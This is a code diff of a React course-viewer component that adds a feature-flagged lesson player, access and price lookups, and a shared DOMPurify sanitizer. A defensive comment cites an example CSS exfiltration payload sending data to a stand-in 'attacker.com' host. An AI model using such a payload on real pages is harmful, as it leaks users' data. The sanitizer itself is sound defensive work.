@@ -1,4 +1,4 @@
-import { useEffect, useState, useCallback, useRef } from "react";
+import { lazy, Suspense, useEffect, useState, useCallback, useRef } from "react";
 import { useParams, useNavigate, Link } from "react-router-dom";
 import { LayoutGroup, motion, useMotionValue, useTransform, animate } from "framer-motion";
 import type { AnimationPlaybackControls } from "framer-motion";
@@ -30,6 +30,9 @@ import { useVideoProgress } from "@/hooks/useVideoProgress";
 import { checkAndGenerateCertificate } from "@/hooks/useCertificateAutoGenerate";
 import { hapticImpact, hapticNotification, tapTick, celebrate } from "@/lib/haptics";
 import { useMotionSafe } from "@/lib/motion";
+import { STAGE_ENABLED } from "@/lib/appearance";
+import { isNative } from "@/lib/platform";
+import { playSound } from "@/lib/sound";
 import type { Chapter, Resource, QnaItem, QnaReply } from "@/components/chapter/types";
 import QuizBlock from "@/components/chapter/QuizBlock";
 import ChapterMediaPlayer from "@/components/chapter/ChapterMediaPlayer";
@@ -39,6 +42,13 @@ import CompletionTakeover from "@/components/chapter/CompletionTakeover";
 import { CompletionRecap } from "@/components/progress/CompletionRecap";
 import { ProgressRing } from "@/components/progress/ProgressRing";
 import ChapterQna from "@/components/chapter/ChapterQna";
+import type { StageProgress, StageSibling } from "@/components/stage/player/StagePlayer";
+
+// Its own chunk, so the flag-off build never loads the Stage player or its CSS.
+const loadStagePlayer = () => import("@/components/stage/player/StagePlayer");
+const StagePlayer = lazy(loadStagePlayer);
+const StageLocked = lazy(() => loadStagePlayer().then((m) => ({ default: m.StageLocked })));
+if (STAGE_ENABLED) void loadStagePlayer();
 
 // The staged completion arc: the course ring animates in place, THEN the
 // takeover enters, THEN (once the takeover has fully exited) the recap follows
@@ -104,6 +114,26 @@ const TAB_ICONS: Record<ChapterTab, typeof Play> = {
   qna: HelpCircle,
 };
 
+/*
+  The article body's DOMPurify config:
+  - `style` is intentionally NOT in ALLOWED_ATTR. Inline styles
+    permit CSS-based exfiltration (e.g. `background-image:
+    url('attacker.com/pixel?data=...')`) and can be used to
+    spoof UI chrome. Presentation stays in CSS classes.
+  - `FORCE_BODY` prevents DOMPurify from upgrading fragments
+    to full documents.
+  - `ALLOWED_URI_REGEXP` restricts anchor/img URLs to http(s)
+    and mailto, blocking `javascript:`, `data:`, and other
+    schemes that can bypass the tag filter.
+*/
+const sanitizeArticle = (html: string) =>
+  DOMPurify.sanitize(html, {
+    ALLOWED_TAGS: ['p','br','strong','b','em','i','u','h1','h2','h3','h4','h5','h6','ul','ol','li','a','code','pre','blockquote','img','table','thead','tbody','tr','th','td','hr','span','div','figure','figcaption','sup','sub'],
+    ALLOWED_ATTR: ['href','target','rel','src','alt','width','height','class','id'],
+    ALLOWED_URI_REGEXP: /^(?:(?:https?|mailto):|[^a-z]|[a-z+.\-]+(?:[^a-z+.\-:]|$))/i,
+    FORCE_BODY: true,
+  });
+
 const ChapterViewer = () => {
   const { chapterId } = useParams<{ chapterId: string }>();
   const navigate = useNavigate();
@@ -133,6 +163,7 @@ const ChapterViewer = () => {
     thumbnail_url: string | null;
     vdocipher_thumbnail_url: string | null;
     description: string | null;
+    make_free?: boolean | null;
   }[]>([]);
   const [currentIndex, setCurrentIndex] = useState(0);
   const [isCompleted, setIsCompleted] = useState(false);
@@ -159,6 +190,13 @@ const ChapterViewer = () => {
   const [courseInstructor, setCourseInstructor] = useState<string | null>(null);
   const [courseHeroImage, setCourseHeroImage] = useState<string | null>(null);
   const [quizzes, setQuizzes] = useState<any[]>([]);
+  // Stage only: whether they own the course (a free lesson opens for anyone),
+  // and the price for the "get all N lessons" line on a free lesson.
+  const [courseAccess, setCourseAccess] = useState<boolean | null>(null);
+  const [offeringPrice, setOfferingPrice] = useState<number | null>(null);
+  // Stage only: where they are in every lesson, for the lesson rows. Read in
+  // the same query as the course totals above, so no extra round trip.
+  const [lessonProgress, setLessonProgress] = useState<StageProgress>({});
 
   const confettiTimerRef = useRef<ReturnType<typeof setTimeout> | null>(null);
   const autoAdvanceTimerRef = useRef<ReturnType<typeof setTimeout> | null>(null);
@@ -168,7 +206,7 @@ const ChapterViewer = () => {
   const coursePct =
     courseTotal > 0 ? Math.round((courseCompleted / courseTotal) * 100) : 0;
 
-  const { updateProgress, lastPosition } = useVideoProgress(chapterId, courseId, user?.id);
+  const { updateProgress, lastPosition, progressPct } = useVideoProgress(chapterId, courseId, user?.id);
 
   // ── Swipe-down-to-dismiss (T3) ──────────────────────────────────────────
   // A Netflix-style drag on the APP-OWNED chrome (the sticky header / grab
@@ -395,10 +433,11 @@ const ChapterViewer = () => {
       // through to any offering that lists this course - we just need
       // a working public landing page to share.
       let resolvedSlug: string | null = null;
+      let resolvedPrice: number | null = null;
       if (courseData?.primary_offering_id) {
         const { data: off } = await supabase
           .from("offerings")
-          .select("slug")
+          .select("slug, price_inr")
           .eq("id", courseData.primary_offering_id)
           // Resolve slug for active OR archived offerings; legacy
           // enrolees on archived programs still need the "Back to
@@ -406,6 +445,7 @@ const ChapterViewer = () => {
           .in("status", ["active", "archived"])
           .maybeSingle();
         resolvedSlug = off?.slug ?? null;
+        resolvedPrice = off?.price_inr ?? null;
       }
       if (!resolvedSlug) {
         // Two-step lookup instead of a PostgREST embed - more robust
@@ -421,7 +461,7 @@ const ChapterViewer = () => {
         if (offeringIds.length > 0) {
           const { data: offs } = await supabase
             .from("offerings")
-            .select("slug, is_public, status")
+            .select("slug, is_public, status, price_inr")
             .in("id", offeringIds)
             .in("status", ["active", "archived"]);
           // Prefer active offerings for the canonical back-link; fall
@@ -430,9 +470,11 @@ const ChapterViewer = () => {
           const publicOnes = ((offs ?? []) as any[]).filter((o) => o.is_public !== false);
           const active = publicOnes.find((o) => o.status === "active");
           resolvedSlug = (active ?? publicOnes[0])?.slug ?? null;
+          resolvedPrice = (active ?? publicOnes[0])?.price_inr ?? null;
         }
       }
       setOfferingSlug(resolvedSlug);
+      setOfferingPrice(resolvedPrice);
     }
 
     // Access check: if not free, verify access before rendering content
@@ -450,6 +492,17 @@ const ChapterViewer = () => {
       }
     }
     setAccessDenied(false);
+
+    // Stage locks the other lessons and offers the course on a free lesson,
+    // so it needs to know whether they own it even when this one is free.
+    if (STAGE_ENABLED) {
+      if (!cid || !ch.make_free || profile?.role === "admin") {
+        setCourseAccess(true);
+      } else {
+        const { data: access } = await supabase.rpc("has_course_access", { p_course_id: cid });
+        setCourseAccess(!!access);
+      }
+    }
 
     // Load all chapter siblings in same course for nav
     if (cid) {
@@ -473,7 +526,7 @@ const ChapterViewer = () => {
         const sectionIds = allSections.map((s) => s.id);
         const { data: allChapters } = await supabase
           .from("chapters")
-          .select("id, title, section_id, sort_order, duration_seconds, content_type, thumbnail_url, vdocipher_thumbnail_url, description")
+          .select("id, title, section_id, sort_order, duration_seconds, content_type, thumbnail_url, vdocipher_thumbnail_url, description, make_free")
           .in("section_id", sectionIds)
           .order("sort_order");
 
@@ -493,6 +546,7 @@ const ChapterViewer = () => {
             thumbnail_url: c.thumbnail_url,
             vdocipher_thumbnail_url: (c as any).vdocipher_thumbnail_url ?? null,
             description: c.description,
+            make_free: c.make_free,
           })));
           setCurrentIndex(sorted.findIndex((c) => c.id === chapterId));
           // Total lessons in the course — the ring's denominator.
@@ -529,11 +583,16 @@ const ChapterViewer = () => {
     if (cid) {
       const { data: courseProg } = await supabase
         .from("chapter_progress")
-        .select("completed_at, last_position_seconds")
+        .select("chapter_id, completed_at, last_position_seconds")
         .eq("course_id", cid)
         .eq("user_id", user.id);
       const rows = courseProg || [];
       setCourseCompleted(rows.filter((p) => p.completed_at).length);
+      setLessonProgress(
+        Object.fromEntries(
+          rows.map((p) => [p.chapter_id, { done: p.completed_at != null, pos: p.last_position_seconds ?? 0 }]),
+        ),
+      );
       setCourseWatchMinutes(
         Math.round(
           rows.reduce((sum, p) => sum + (p.last_position_seconds || 0), 0) / 60,
@@ -886,6 +945,7 @@ const ChapterViewer = () => {
     setIsCompleted(true);
     setSubmitting(false);
     hapticImpact("light");
+    if (STAGE_ENABLED) playSound("complete");
 
     // Check for milestone (progress celebration)
     const { data: allProgress } = await supabase
@@ -1047,6 +1107,25 @@ const ChapterViewer = () => {
   }
 
   if (accessDenied) {
+    if (STAGE_ENABLED) {
+      const toCourse = courseId ? () => navigate(`/courses/${courseId}`) : null;
+      const toLearn = { label: "My learning", onClick: () => navigate("/learn") };
+      return (
+        <Suspense fallback={null}>
+          <StageLocked
+            courseTitle={courseTitle}
+            primary={
+              offeringSlug
+                ? { label: isNative() ? "See the program" : "Get the course", onClick: () => navigate(`/p/${offeringSlug}`) }
+                : toCourse
+                  ? { label: "See the course", onClick: toCourse }
+                  : { label: "Go to Home", onClick: () => navigate("/home") }
+            }
+            secondary={offeringSlug && toCourse ? { label: "Back to the course", onClick: toCourse } : toLearn}
+          />
+        </Suspense>
+      );
+    }
     return (
       <div className="flex flex-col items-center justify-center min-h-screen bg-background text-center px-4">
         <div className="w-16 h-16 rounded-full bg-surface-2 flex items-center justify-center mb-4">
@@ -1073,28 +1152,41 @@ const ChapterViewer = () => {
 
   if (!chapter) return null;
 
-  return (
-    <div className="min-h-screen bg-background text-foreground pb-[env(safe-area-inset-bottom)]">
-      <Confetti active={showConfetti} />
-      {milestone && (
-        <div className="fixed top-20 left-1/2 -translate-x-1/2 z-[9998] milestone-banner">
-          <div className="bg-card border border-border rounded-2xl px-4 sm:px-6 py-4 shadow-2xl text-center max-w-[calc(100vw-2rem)] sm:max-w-sm">
-            <p className="text-lg font-semibold">{milestone.title}</p>
-            <p className="text-sm text-muted-foreground mt-1">{milestone.subtitle}</p>
-            <div className="mt-2 h-1.5 bg-surface-2 rounded-full overflow-hidden">
-              <div className="h-full bg-[hsl(var(--cream))] rounded-full motion-safe:transition-all motion-safe:duration-sweep" style={{ width: `${milestone.pct}%` }} />
-            </div>
-          </div>
-        </div>
-      )}
-      {/* The completion arc. Beat 1 (the in-place ring) fires in
-          handleMarkComplete; here are beats 2 and 3. The takeover enters once
-          the ring has settled; EVERY dismissal path (CTA, backdrop, close,
-          Escape) moves the arc to `recapWait`, which flips the takeover shut so
-          its exit animation plays. Only when that exit completes (`onExited`)
-          does the recap enter — so the two overlays never share the screen.
-          A route change / Android back mid-arc unmounts both; the takeover's
-          own effect cleanup (the app's sole body-lock owner) restores scroll. */}
+  // Poster-hide the live media surface during a dismiss drag. The
+  // cross-origin player (VdoCipher / Vimeo / YouTube iframe, the PDF
+  // iframe, or the app-owned <video>) is the priciest layer to
+  // re-composite under a scaling+translating ancestor. Occluding it
+  // with a static poster lets Blink cull the live surface for the
+  // duration of the gesture; it's removed the instant the drag
+  // settles, so playback/scroll position is untouched. Only the
+  // iframe/video content types need this — image/article surfaces
+  // are cheap and are left visible.
+  const dragPoster =
+    dragActive &&
+    (chapter.content_type === "video" ||
+      chapter.content_type === "pdf" ||
+      chapter.content_type === "embedded") && (
+      <div
+        aria-hidden
+        className="absolute inset-0 z-10 overflow-hidden rounded-2xl bg-black"
+      >
+        {(chapter.thumbnail_url || chapter.vdocipher_thumbnail_url) && (
+          <img
+            src={
+              chapter.thumbnail_url ||
+              chapter.vdocipher_thumbnail_url ||
+              undefined
+            }
+            alt=""
+            aria-hidden
+            className="h-full w-full object-cover"
+          />
+        )}
+      </div>
+    );
+
+  const completionArc = (
+    <>
       <CompletionTakeover
         open={arcPhase === "takeover"}
         variant="course"
@@ -1131,6 +1223,143 @@ const ChapterViewer = () => {
           null
         }
       />
+    </>
+  );
+
+  if (STAGE_ENABLED) {
+    // No confetti and no milestone banner under Stage (spec 12.1): the toast
+    // carries the milestone, the ring and the arc carry the course.
+    const owned = courseAccess !== false;
+    const priceText =
+      offeringPrice && Number(offeringPrice) > 0 && !isNative()
+        ? ` for ₹${Math.round(Number(offeringPrice)).toLocaleString("en-IN")}`
+        : "";
+    const toSales = () => navigate(offeringSlug ? `/p/${offeringSlug}` : courseId ? `/courses/${courseId}` : "/home");
+    const qnaDot = qna.some(
+      (q) => q.replies.some((r) => r.is_instructor_reply) && q.user_id === user?.id && !q.is_resolved,
+    );
+    return (
+      <div className="min-h-screen bg-background">
+        {completionArc}
+        <motion.div
+          style={dragActive ? { y: dismissY, scale: dismissScale } : undefined}
+          className={dragActive ? "relative origin-top will-change-transform" : undefined}
+        >
+          {dragActive && (
+            <motion.div
+              aria-hidden
+              className="pointer-events-none absolute inset-0 z-40 bg-background"
+              style={{ opacity: dismissScrim }}
+            />
+          )}
+          <Suspense fallback={null}>
+            <StagePlayer
+              grab={{
+                onPointerDown: onHeaderPointerDown,
+                onPointerMove: onHeaderPointerMove,
+                onPointerUp: endHeaderDrag,
+                onPointerCancel: endHeaderDrag,
+                onClickCapture: onHeaderClickCapture,
+                style: motionSafe.reduced ? undefined : { touchAction: "none" },
+              }}
+              showGrab={!motionSafe.reduced}
+              loading={loading}
+              courseTitle={courseTitle}
+              backLabel={courseId ? courseTitle || "the course" : "Home"}
+              onBack={() => navigate(dismissTarget)}
+              onShare={handleShare}
+              player={
+                <div className="relative">
+                  <ChapterMediaPlayer chapter={chapter} updateProgress={updateProgress} lastPosition={lastPosition} />
+                  {dragPoster}
+                </div>
+              }
+              title={chapter.title}
+              description={chapter.description}
+              siblings={siblings as StageSibling[]}
+              currentId={chapter.id}
+              currentIndex={currentIndex}
+              progress={lessonProgress}
+              livePct={progressPct}
+              done={isCompleted}
+              busy={submitting}
+              onDone={handleMarkComplete}
+              course={
+                courseTotal > 0
+                  ? { pct: Math.min(100, coursePct), done: Math.min(courseCompleted, courseTotal), total: courseTotal }
+                  : null
+              }
+              owned={owned}
+              upsell={
+                owned
+                  ? null
+                  : {
+                      text: `This lesson is free. Get all ${siblings.length} lessons${priceText}.`,
+                      label: isNative() ? "See the program" : "Get it",
+                      open: toSales,
+                    }
+              }
+              notes={{ value: notes, onChange: setNotes, saved: notesSavedAt != null }}
+              about={
+                chapter.article_body ? (
+                  <div className="prose prose-invert prose-sm max-w-none">
+                    <div dangerouslySetInnerHTML={{ __html: sanitizeArticle(chapter.article_body) }} />
+                  </div>
+                ) : null
+              }
+              resources={resources}
+              qna={
+                <ChapterQna
+                  qna={qna}
+                  questionText={questionText}
+                  setQuestionText={setQuestionText}
+                  onPost={handlePostQuestion}
+                  submitting={submitting}
+                  qnaLimit={qnaLimit}
+                  setQnaLimit={setQnaLimit}
+                />
+              }
+              qnaCount={qna.length}
+              qnaDot={qnaDot}
+              quizzes={
+                quizzes.length > 0 ? (
+                  <div className="space-y-6">
+                    {quizzes.map((quiz) => (
+                      <QuizBlock key={quiz.id} quiz={quiz} userId={user?.id} />
+                    ))}
+                  </div>
+                ) : null
+              }
+            />
+          </Suspense>
+        </motion.div>
+      </div>
+    );
+  }
+
+  return (
+    <div className="min-h-screen bg-background text-foreground pb-[env(safe-area-inset-bottom)]">
+      <Confetti active={showConfetti} />
+      {milestone && (
+        <div className="fixed top-20 left-1/2 -translate-x-1/2 z-[9998] milestone-banner">
+          <div className="bg-card border border-border rounded-2xl px-4 sm:px-6 py-4 shadow-2xl text-center max-w-[calc(100vw-2rem)] sm:max-w-sm">
+            <p className="text-lg font-semibold">{milestone.title}</p>
+            <p className="text-sm text-muted-foreground mt-1">{milestone.subtitle}</p>
+            <div className="mt-2 h-1.5 bg-surface-2 rounded-full overflow-hidden">
+              <div className="h-full bg-[hsl(var(--cream))] rounded-full motion-safe:transition-all motion-safe:duration-sweep" style={{ width: `${milestone.pct}%` }} />
+            </div>
+          </div>
+        </div>
+      )}
+      {/* The completion arc. Beat 1 (the in-place ring) fires in
+          handleMarkComplete; here are beats 2 and 3. The takeover enters once
+          the ring has settled; EVERY dismissal path (CTA, backdrop, close,
+          Escape) moves the arc to `recapWait`, which flips the takeover shut so
+          its exit animation plays. Only when that exit completes (`onExited`)
+          does the recap enter — so the two overlays never share the screen.
+          A route change / Android back mid-arc unmounts both; the takeover's
+          own effect cleanup (the app's sole body-lock owner) restores scroll. */}
+      {completionArc}
 
       {/* The dismissible screening-room surface. The completion overlays,
           milestone banner and confetti stay OUTSIDE this wrapper — they're
@@ -1278,37 +1507,7 @@ const ChapterViewer = () => {
           >
             <div className="relative">
               <ChapterMediaPlayer chapter={chapter} updateProgress={updateProgress} lastPosition={lastPosition} />
-              {/* Poster-hide the live media surface during a dismiss drag. The
-                  cross-origin player (VdoCipher / Vimeo / YouTube iframe, the PDF
-                  iframe, or the app-owned <video>) is the priciest layer to
-                  re-composite under a scaling+translating ancestor. Occluding it
-                  with a static poster lets Blink cull the live surface for the
-                  duration of the gesture; it's removed the instant the drag
-                  settles, so playback/scroll position is untouched. Only the
-                  iframe/video content types need this — image/article surfaces
-                  are cheap and are left visible. */}
-              {dragActive &&
-                (chapter.content_type === "video" ||
-                  chapter.content_type === "pdf" ||
-                  chapter.content_type === "embedded") && (
-                  <div
-                    aria-hidden
-                    className="absolute inset-0 z-10 overflow-hidden rounded-2xl bg-black"
-                  >
-                    {(chapter.thumbnail_url || chapter.vdocipher_thumbnail_url) && (
-                      <img
-                        src={
-                          chapter.thumbnail_url ||
-                          chapter.vdocipher_thumbnail_url ||
-                          undefined
-                        }
-                        alt=""
-                        aria-hidden
-                        className="h-full w-full object-cover"
-                      />
-                    )}
-                  </div>
-                )}
+              {dragPoster}
             </div>
           </AmbientGlow>
 
@@ -1577,24 +1776,7 @@ const ChapterViewer = () => {
               )}
               {chapter.article_body && (
                 <div className="prose prose-invert prose-sm max-w-none">
-                  {/*
-                    DOMPurify config notes:
-                    - `style` is intentionally NOT in ALLOWED_ATTR. Inline styles
-                      permit CSS-based exfiltration (e.g. `background-image:
-                      url('attacker.com/pixel?data=...')`) and can be used to
-                      spoof UI chrome. Presentation stays in CSS classes.
-                    - `FORCE_BODY` prevents DOMPurify from upgrading fragments
-                      to full documents.
-                    - `ALLOWED_URI_REGEXP` restricts anchor/img URLs to http(s)
-                      and mailto, blocking `javascript:`, `data:`, and other
-                      schemes that can bypass the tag filter.
-                  */}
-                  <div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(chapter.article_body, {
-                    ALLOWED_TAGS: ['p','br','strong','b','em','i','u','h1','h2','h3','h4','h5','h6','ul','ol','li','a','code','pre','blockquote','img','table','thead','tbody','tr','th','td','hr','span','div','figure','figcaption','sup','sub'],
-                    ALLOWED_ATTR: ['href','target','rel','src','alt','width','height','class','id'],
-                    ALLOWED_URI_REGEXP: /^(?:(?:https?|mailto):|[^a-z]|[a-z+.\-]+(?:[^a-z+.\-:]|$))/i,
-                    FORCE_BODY: true,
-                  }) }} />
+                  <div dangerouslySetInnerHTML={{ __html: sanitizeArticle(chapter.article_body) }} />
                 </div>
               )}
             </TabsContent>
